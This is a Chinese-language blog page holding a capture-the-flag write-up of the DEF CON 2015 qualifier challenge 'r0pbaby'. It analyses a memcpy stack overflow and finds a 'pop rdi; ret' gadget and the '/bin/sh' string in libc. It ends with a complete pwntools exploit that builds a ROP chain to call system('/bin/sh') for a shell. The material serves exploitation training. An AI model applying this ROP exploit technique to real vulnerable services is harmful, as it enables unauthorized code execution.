@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang>
+  <head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+<meta name="theme-color" content="#f8f5ec">
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="Defcon 2015 R0pbaby writeup"><meta name="keywords" content="sec|secruity|blog"><link rel="alternate" href="/atom.xml" title="danta"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.1">
+<link rel="canonical" href="https://cxliker.github.io/2019/12/15/Defcon-2015-R0pbaby-writeup/">
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css"><link rel="stylesheet" type="text/css" href="/lib/nprogress/nprogress.min.css">
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.1">
+
+<script id="baidu_analytics">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?1fb3396bc01d62b8be6fcb651441065c";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script><script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script src="//cdn1.lncld.net/static/js/3.1.1/av-min.js"></script>
+  <script id="leancloud">
+    AV.init({
+      appId: "92CcA9DvqYFSomQnzdApeHt9-gzGzoHsz",
+      appKey: "gAPpmDXQmTGE9s9a3eU4nJ0h"
+    });
+  </script><script>
+  window.config = {"leancloud":{"app_id":"92CcA9DvqYFSomQnzdApeHt9-gzGzoHsz","app_key":"gAPpmDXQmTGE9s9a3eU4nJ0h"},"toc":true,"fancybox":true,"pjax":true,"latex":false};
+</script>
+
+    <title>Defcon 2015 R0pbaby writeup - danta</title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">danta</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/archives/">
+        <li class="mobile-menu-item">归档
+          </li>
+      </a><a href="/about">
+        <li class="mobile-menu-item">关于
+          </li>
+      </a><a href="/atom.xml">
+        <li class="mobile-menu-item">RSS
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">danta</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            归档
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about">
+            关于
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/atom.xml">
+            RSS
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">Defcon 2015 R0pbaby writeup
+        </h1>
+
+      <div class="post-meta">
+        <span class="author">
+          danta
+        </span>
+        <span class="post-time">
+          2019-12-15 15:10
+        </span><span class="post-visits" data-url="/2019/12/15/Defcon-2015-R0pbaby-writeup/" data-title="Defcon 2015 R0pbaby writeup">
+          Visits 0
+        </span>
+        </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-分析"><span class="toc-text">0x01 分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-找Gadgets"><span class="toc-text">0x02 找Gadgets</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-找-bin-sh的地址"><span class="toc-text">0x03 找/bin/sh的地址</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-exp"><span class="toc-text">0x04 exp</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文有关的binary可以到我的github中下载：<a href="https://github.com/cxliker/ctf_pwn/tree/master/r0pbaby" target="_blank" rel="noopener">https://github.com/cxliker/ctf_pwn/tree/master/r0pbaby</a><br>从题目就可以看出来，这应该是算一道简单的rop题目吧。</p>
+<h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><p>题目没有给libc.so文件，只有一个elf文件，可以先用checksec.sh看看程序开了什么保护：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+
+<p>可以看到r0pbaby是一个64位的程序，传参要用寄存器实现，往往就意味需要找gadgets来实现。<br>NX开启了意味着栈上不能执行shellcode，而PIE开启了说明每次程序执行的时候内部变量什么的地址都是变化的。</p>
+<p>接下来我们还是像例行公事一下运行一下程序跑跑流程，以企图找到程序漏洞的地方。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./r0pbaby</span></span><br><span class="line"></span><br><span class="line">Welcome to an easy Return Oriented Programming challenge...</span><br><span class="line">Menu:</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc <span class="keyword">function</span></span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 1</span><br><span class="line">libc.so.6: 0x00007FDF6F13E4F0</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc <span class="keyword">function</span></span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 2</span><br><span class="line">Enter symbol: system</span><br><span class="line">Symbol system: 0x00007FDF6E9D1510</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc <span class="keyword">function</span></span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 3</span><br><span class="line">Enter bytes to send (max 1024): <span class="built_in">test</span></span><br><span class="line">Invalid amount.</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc <span class="keyword">function</span></span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 4</span><br><span class="line">Exiting.</span><br></pre></td></tr></table></figure>
+
+<p>从上图我们看出<br>功能1：用来获得libc的基地址。<br>功能2：可以获得任意libc function的地址<br>功能3：我们可以发送不超过1024个字符的数据到程序中</p>
+<p>做到现在，事情已经有一点明朗了。<br>不过题目中有一个奇怪的地方是，从功能1获得的libc基地址并不是真正的libc的基地址，因为你可以看到上面的结果，基地址的地址怎么会比system函数的地址还要大？并且基地址的地址并没有页对齐，不是0x1000的倍数（页大小通常4k，即4096bytes）。一个大神的<a href="https://blog.skullsecurity.org/2015/defcon-quals-r0pbaby-simple-64-bit-rop" target="_blank" rel="noopener">writeup</a>中提到说很有可能是题目的bug。<br>不过即使没有libc的基地址，我们有功能2，可以泄漏任何函数的地址，已经足够我们算出libc的基地址了。然后通过泄漏出来的libc中的函数地址，构造rop链利用功能3发送出去getshell。</p>
+<p>为了证明思路，我们用ida分析一下程序：</p>
+<p><img src="/image/7.jpg" alt></p>
+<p>程序中用到了<code>memcpy</code>函数，但是并没有检查并限制数据的大小，于是产生了缓冲区溢出漏洞。</p>
+<p><code>memcpy</code>的API：</p>
+<blockquote>
+<p>void memcpy(voiddest, const void * src, size_t n);<br>由src指向地址为起始地址的连续n个字节的数据复制到以destin指向地址为起始地址的空间内。</p>
+</blockquote>
+<p>其中一个值得注意的地方是，通过阅读代码发现，功能3正确的用法应该是先输入数据的长度，再输入数据。如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./r0pbaby </span></span><br><span class="line"></span><br><span class="line">Welcome to an easy Return Oriented Programming challenge...</span><br><span class="line">Menu:</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc <span class="keyword">function</span></span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 3</span><br><span class="line">Enter bytes to send (max 1024): 5</span><br><span class="line">abcde</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc <span class="keyword">function</span></span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: Bad choice.</span><br></pre></td></tr></table></figure>
+
+<p>根据上面的信息，解题的思路已经出来了，我们需要：</p>
+<ol>
+<li>找到<code>pop rdi; ret</code>的gadgets。</li>
+<li>算出<code>/bin/sh</code>在libc中的地址。</li>
+<li>找到<code>system</code>的地址，这个容易，可以直接通过功能2获得。</li>
+</ol>
+<p>因为程序中没有调用system函数，也没有<code>/bin/sh</code>的字符串，所以只能到libc.so中找。但由于题目没有给libc.so文件，就只能用自己的本机的测试。如果题目环境中的libc.so文件和自己本地的版本有差异，可以通过功能2 leak出两个函数的地址，算出offset，再看看在libc database中找到对应的版本。</p>
+<p>找到本机的libc.so文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ldd r0pbaby </span></span><br><span class="line">	linux-vdso.so.1 (0x00007ffc70789000)</span><br><span class="line">	libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ff469cbd000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff469903000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007ff46a0c4000)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到文件在<code>/lib/x86_64-linux-gnu/libc.so.6</code></p>
+<h1 id="0x02-找Gadgets"><a href="#0x02-找Gadgets" class="headerlink" title="0x02 找Gadgets"></a>0x02 找Gadgets</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ROPgadget --binary lib.so.6 --only 'pop|ret' | grep rdi</span></span><br><span class="line">0x0000000000021fad : pop rdi ; pop rbp ; ret</span><br><span class="line">0x000000000002144f : pop rdi ; ret</span><br><span class="line">0x000000000009c851 : pop rdi ; ret 0xd</span><br><span class="line">0x00000000000b505d : pop rdi ; ret 0xfff6</span><br></pre></td></tr></table></figure>
+
+<p>找到一个很适用的<code>0x000000000002144f</code>，但由于程序开启了PIE，服务器甚至也可能开了ASLR，所以每次的地址都是变化的，但是虽然是变化，函数之间的偏移量是不变的，如果我们通过功能2获取到了一个函数的真实地址，就可以通过偏移量算出这个gadget的真实地址。以下的<code>/bin/sh</code>也同理。</p>
+<h1 id="0x03-找-bin-sh的地址"><a href="#0x03-找-bin-sh的地址" class="headerlink" title="0x03 找/bin/sh的地址"></a>0x03 找<code>/bin/sh</code>的地址</h1><p><code>pwntools</code>有个很好用的模块<code>ELF</code>，里面有个很好用的函数可以找到字符串的地址，用法如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'lib.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sh_addr = elf.search(<span class="string">'/bin/sh'</span>).next()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04 exp"></a>0x04 exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'lib.so.6'</span>)</span><br><span class="line"></span><br><span class="line">base_libc_addr = elf.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"></span><br><span class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">sh_addr = elf.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">offset_system_addr = system_addr - base_libc_addr</span><br><span class="line">offset_sh_addr = sh_addr - base_libc_addr</span><br><span class="line">offset_pr_addr = <span class="number">0x2144f</span> - system_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./r0pbaby'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Menu:'</span>)</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.sendline(<span class="string">'system'</span>)</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">system_addr_real = int(p.recvline(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = system_addr_real - offset_system_addr</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base = "</span> + hex(libc_base)</span><br><span class="line">rdi_addr = system_addr_real + offset_pr_addr</span><br><span class="line"><span class="keyword">print</span> <span class="string">"rdi_addr = "</span> + hex(rdi_addr)</span><br><span class="line">binsh_addr = libc_base + offset_sh_addr</span><br><span class="line"><span class="keyword">print</span> <span class="string">"binsh_addr = "</span> + hex(binsh_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr = "</span> + hex(system_addr_real)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">8</span> + p64(rdi_addr) + p64(binsh_addr) + p64(system_addr_real)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">1024</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recv(<span class="number">1024</span>)</span><br><span class="line">p.send(<span class="string">"%d\n"</span>%(len(payload)+<span class="number">1</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+      </div>
+      <footer class="post-footer">
+        
+        <nav class="post-nav"><a class="prev" href="/2019/12/15/PlaidCTF-2013-ropasaurusrex-writeup/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">PlaidCTF 2013 ropasaurusrex writeup</span>
+        <span class="prev-text nav-mobile">上一篇</span>
+      </a>
+    <a class="next" href="/2019/12/14/htb-safe-writeup/">
+        <span class="next-text nav-default">htb-safe-writeup</span>
+        <span class="prev-text nav-mobile">下一篇</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"><div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:cxliker@qq.com" class="iconfont icon-email" title="email"></a>
+        <a href="https://github.com/cxliker" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://hexo.io/">Hexo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2018 - 2019<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">danta</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'https://cxliker.github.io/2019/12/15/Defcon-2015-R0pbaby-writeup/';
+        this.page.identifier = '2019/12/15/Defcon-2015-R0pbaby-writeup/';
+        this.page.title = 'Defcon 2015 R0pbaby writeup';
+    };
+    (function() {
+    var d = document, s = d.createElement('script');
+
+    s.src = '//cxliker.disqus.com/embed.js';
+
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();  
+  </script><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/lib/pjax/jquery.pjax.min.js"></script>
+  <script type="text/javascript" src="/lib/nprogress/nprogress.min.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.1"></script>
+</body>
+</html>
